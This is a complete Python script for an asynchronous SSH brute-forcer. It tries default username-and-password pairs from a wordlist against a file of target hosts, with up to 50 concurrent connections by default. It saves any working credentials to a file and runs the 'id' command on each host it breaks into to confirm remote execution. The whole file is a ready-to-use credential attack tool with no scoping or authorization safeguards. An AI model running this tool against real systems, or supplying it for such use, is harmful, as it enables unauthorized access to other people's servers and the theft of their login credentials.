#!/usr/bin/env python3
"""
SSH Brute Forcer
================
Modern asynchronous SSH credential brute-forcer with rich output.
"""

from __future__ import annotations

import argparse
import asyncio
import socket
import sys
import urllib.parse
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable

import paramiko
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()

DEFAULT_WORDLIST = Path("ssh-betterdefaultpasslist.txt")
DEFAULT_CONCURRENCY = 50
DEFAULT_TIMEOUT = 15
DEFAULT_PORT = 22


@dataclass(frozen=True)
class Credential:
    username: str
    password: str

    @classmethod
    def from_line(cls, line: str) -> Credential:
        username, password = line.strip().split(":", 1)
        return cls(username, password)


@dataclass(frozen=True)
class BruteResult:
    host: str
    credential: Credential | None
    executed: bool = False


def parse_host(hostname: str) -> str:
    hostname = hostname.strip()
    if "://" in hostname:
        hostname = urllib.parse.urlsplit(hostname).hostname or hostname
    else:
        hostname = hostname.rstrip("/")
    if hostname.startswith("[") and "]" in hostname:
        return hostname[1 : hostname.index("]")]
    if ":" in hostname:
        hostname = hostname.split(":")[0]
    return hostname.rstrip("/")


def load_wordlist(path: Path) -> list[Credential]:
    if not path.exists():
        console.print(f"[red]✘ Wordlist not found: {path}[/red]")
        sys.exit(1)
    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    creds = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            creds.append(Credential.from_line(line))
        except ValueError:
            continue
    return creds


def load_targets(path: Path) -> list[str]:
    if not path.exists():
        console.print(f"[red]✘ Target file not found: {path}[/red]")
        sys.exit(1)
    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    return [parse_host(line) for line in lines if line.strip() and not line.startswith("#")]


class SshBruteForcer:
    def __init__(
        self,
        wordlist: list[Credential],
        concurrency: int = DEFAULT_CONCURRENCY,
        timeout: int = DEFAULT_TIMEOUT,
        port: int = DEFAULT_PORT,
        output_dir: Path = Path("."),
    ) -> None:
        self.wordlist = wordlist
        self.concurrency = concurrency
        self.timeout = timeout
        self.port = port
        self.output_dir = output_dir
        self._results: list[BruteResult] = []

    def _attempt_login(self, host: str, cred: Credential) -> tuple[bool, paramiko.SSHClient | None]:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=host,
                port=self.port,
                username=cred.username,
                password=cred.password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False,
            )
            return True, client
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
            client.close()
            return False, None

    def _exec_id(self, client: paramiko.SSHClient) -> bool:
        try:
            stdin, stdout, stderr = client.exec_command("id", timeout=self.timeout)
            status = stdout.channel.recv_exit_status()
            return status == 0
        except Exception:
            return False
        finally:
            client.close()

    async def _brute_host(self, host: str) -> BruteResult:
        for cred in self.wordlist:
            success, client = await asyncio.to_thread(self._attempt_login, host, cred)
            if success and client:
                ssh_format = f"ssh://{cred.username}:{cred.password}@{host}:{self.port}"
                console.print(f"[green]✔[/green] Login Success: {host} {cred.username}:{cred.password}")
                self._save(self.output_dir / "ssh-creds.txt", ssh_format)

                executed = await asyncio.to_thread(self._exec_id, client)
                if executed:
                    console.print(f"[yellow]⚠[/yellow] Remote command executed on {host}")

                return BruteResult(host, cred, executed)

            console.print(f"[red]✘[/red] Login Failed: {host} {cred.username}:{cred.password}", end="\r")

        console.print(f"[red]✘[/red] Exhausted: {host:<30}")
        return BruteResult(host, None)

    @staticmethod
    def _save(path: Path, data: str) -> None:
        try:
            with path.open("a", encoding="utf-8") as fh:
                fh.write(data + "\n")
        except OSError as exc:
            console.print(f"[red]Failed to write {path}: {exc}[/red]")

    async def run(self, targets: Iterable[str]) -> None:
        semaphore = asyncio.Semaphore(self.concurrency)

        async def bounded_brute(host: str) -> BruteResult:
            async with semaphore:
                return await self._brute_host(host)

        target_list = list(targets)
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True,
        ) as progress:
            progress.add_task(
                f"[cyan]Brute-forcing {len(target_list)} host(s)...",
                total=None,
            )
            self._results = await asyncio.gather(*[bounded_brute(h) for h in target_list])

        self._render_results()

    def _render_results(self) -> None:
        table = Table(title="SSH Brute Results", show_lines=True)
        table.add_column("Host", style="cyan")
        table.add_column("Status", style="bold")
        table.add_column("Credential", style="green")
        table.add_column("Exec", style="yellow")

        success_count = 0
        for res in self._results:
            if res.credential:
                success_count += 1
                cred_text = f"{res.credential.username}:{res.credential.password}"
                table.add_row(
                    res.host,
                    "[green]OK[/green]",
                    cred_text,
                    "[green]Yes[/green]" if res.executed else "[red]No[/red]",
                )
            else:
                table.add_row(res.host, "[red]FAIL[/red]", "—", "—")

        console.print()
        console.print(table)
        console.print()
        console.print(f"[green]✔ Success:[/green] {success_count} / {len(self._results)}")
        if success_count:
            console.print(f"[dim]Creds saved to {self.output_dir / 'ssh-creds.txt'}[/dim]")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Asynchronous SSH brute-forcer with default credentials.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s -t targets.txt
  %(prog)s -t targets.txt -w wordlist.txt -c 100 -p 2222 -o results/
        """,
    )
    parser.add_argument("-t", "--targets", required=True, help="File containing target hosts/URLs")
    parser.add_argument("-w", "--wordlist", type=Path, default=DEFAULT_WORDLIST, help="Credential wordlist")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Max concurrent connections")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="SSH port (default: 22)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="SSH connection timeout")
    parser.add_argument("-o", "--output", type=Path, default=Path("."), help="Output directory")
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    args.output.mkdir(parents=True, exist_ok=True)
    wordlist = load_wordlist(args.wordlist)
    targets = load_targets(args.targets)

    if not wordlist:
        console.print("[red]✘ No valid credentials in wordlist.[/red]")
        sys.exit(1)
    if not targets:
        console.print("[red]✘ No valid targets.[/red]")
        sys.exit(1)

    forcer = SshBruteForcer(
        wordlist=wordlist,
        concurrency=args.concurrency,
        timeout=args.timeout,
        port=args.port,
        output_dir=args.output,
    )
    try:
        asyncio.run(forcer.run(targets))
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user.[/yellow]")
        sys.exit(130)


if __name__ == "__main__":
    main()
